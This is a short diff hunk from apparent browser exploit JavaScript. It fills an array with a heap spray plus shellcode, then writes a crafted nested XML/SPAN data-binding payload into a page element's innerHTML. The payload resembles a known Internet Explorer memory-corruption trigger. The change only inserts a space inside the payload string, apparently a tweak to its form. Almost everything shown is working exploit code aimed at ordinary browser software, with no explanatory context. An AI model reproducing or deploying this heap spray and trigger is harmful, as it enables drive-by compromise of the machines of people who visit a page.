@@ -20,7 +20,7 @@
         for(i = 0; i < 100; i++)
            memory[i] = spray + shellcode;
 
-        xmlcode = "<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
+        xmlcode = "<XML ID=I> <X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
 
         tag = document.getElementById("replace");
         tag.innerHTML = xmlcode;
